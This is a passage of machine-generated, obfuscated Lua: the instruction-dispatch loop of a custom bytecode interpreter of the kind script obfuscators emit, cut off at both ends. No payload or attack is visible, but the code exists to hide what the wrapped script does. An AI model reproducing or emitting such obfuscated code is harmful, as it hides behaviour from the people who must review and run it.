g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];e[a[3]]=c[a[2]];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2];i=c[g];for a=g+1,a[3]do m(i,c[a])end;else c[a[2]][a[3]]=a[4];end;elseif g<=276 then local h;local g;c[a[2]]();b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];elseif g>277 then if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;else c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];end;elseif g<=289 then if g<=283 then if g<=280 then if g>279 then if(c[a[2]]~=a[4])then b=b+1;else b=a[3];end;else local h;local g;g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))end;elseif g<=281 then local d=a[2]local e={c[d](f(c,d+1,h))};local b=0;for a=d,a[4]do b=b+1;c[a]=e[b];end elseif g>282 then local a=a[2]c[a](c[a+1])else c[a[2]]=c[a[3]]-a[4];end;elseif g<=286 then if g<=284 then local b=a[2]local e={c[b]()};local d=a[4];local a=0;for b=b,d do a=a+1;c[b]=e[a];end elseif g==285 then local b=a[2]local d={c[b]()};local e=a[4];local a=0;for b=b,e do a=a+1;c[b]=d[a];end else c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];end;elseif g<=287 then if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;elseif g>288 then local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];if not c[a[2]]then b=b+1;else b=a[3];end;else c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];end;elseif g<=294 then if g<=291 then if g==290 then local f;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=a[4];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];f=a[2]c[f](c[f+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];else local d=a[2];local b=c[a[3]];c[d+1]=b;c[d]=b[a[4]];end;elseif g<=292 then local b=a[2];local d=c[a[3]];c[b+1]=d;c[b]=d[c[a[4]]];elseif g>293 then local g;local i;local h;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];h=a[2]c[h]=c[h](f(c,h+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];g=c[i]for a=i+1,a[4]do g=g..c[a];end;c[a[2]]=g;b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;else e[a[3]]=c[a[2]];end;elseif g<=297 then if g<=295 then local h;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;elseif g==296 then local g;local j;local l,m;local k;local g;c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];k=c[a[3]];c[g+1]=k;c[g]=k[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];g=a[2];k=c[a[3]];c[g+1]=k;c[g]=k[a[4]];b=b+1;a=d[b];g=a[2]l,m=i(c[g](c[g+1]))h=m+g-1 j=0;for a=g,h do j=j+1;c[a]=l[j];end;b=b+1;a=d[b];g=a[2]l={c[g](f(c,g+1,h))};j=0;for a=g,a[4]do j=j+1;c[a]=l[j];end b=b+1;a=d[b];b=a[3];else local j;local k,l;local g;c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]k,l=i(c[g](f(c,g+1,a[3])))h=l+g-1 j=0;for a=g,h do j=j+1;c[a]=k[j];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]k,l=i(c[g](f(c,g+1,a[3])))h=l+g-1 j=0;for a=g,h do j=j+1;c[a]=k[j];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];end;elseif g<=298 then c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=-c[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];elseif g>299 then c[a[2]]=k[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];else local h;local g;c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];end;elseif g<=322 then if g<=311 then if g<=305 then if g<=302 then if g==301 then local h;local g;g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];else k[a[3]]=c[a[2]];end;elseif g<=303 then local h;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];if not c[a[2]]then b=b+1;else b=a[3];end;elseif g>304 then local h;local g;c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];else local h;local g;c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];b=a[3];end;elseif g<=308 then if g<=306 then c[a[2]]=c[a[3]][c[a[4]]];elseif g>307 then local g;local f;local e;c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];e=a[2];f=c[e]g=c[e+2];if(g>0)then if(f>c[e+1])then b=a[3];else c[e+3]=f;end elseif(f<c[e+1])then b=a[3];else c[e+3]=f;end else if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;end;elseif g<=309 then local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];elseif g>310 then local h;local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;else local k;local m,l;local j;local g;g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]m,l=i(c[g](c[g+1]))h=l+g-1 k=0;for a=g,h do k=k+1;c[a]=m[k];end;b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];b=a[3];end;elseif g<=316 then if g<=313 then if g==312 then b=a[3];else local a=a[2]c[a]=c[a](f(c,a+1,h))end;elseif g<=314 then c[a[2]]=e[a[3]];elseif g==315 then local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])else local h;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))end;elseif g<=319 then if g<=317 then local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];elseif g>318 then local k;local l,m;local j;local g;g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]l,m=i(c[g](f(c,g+1,a[3])))h=m+g-1 k=0;for a=g,h do k=k+1;c[a]=l[k];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=(a[3]~=0);b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]l,m=i(c[g](f(c,g+1,a[3])))h=m+g-1 k=0;for a=g,h do k=k+1;c[a]=l[k];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=(a[3]~=0);b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];else local h;local i;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];h=c[i]for a=i+1,a[4]do h=h..c[a];end;c[a[2]]=h;b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;end;elseif g<=320 then if(c[a[2]]==a[4])then b=b+1;else b=a[3];end;elseif g==321 then c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];else local k;local l,m;local j;local g;g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]l,m=i(c[g](c[g+1]))h=m+g-1 k=0;for a=g,h do 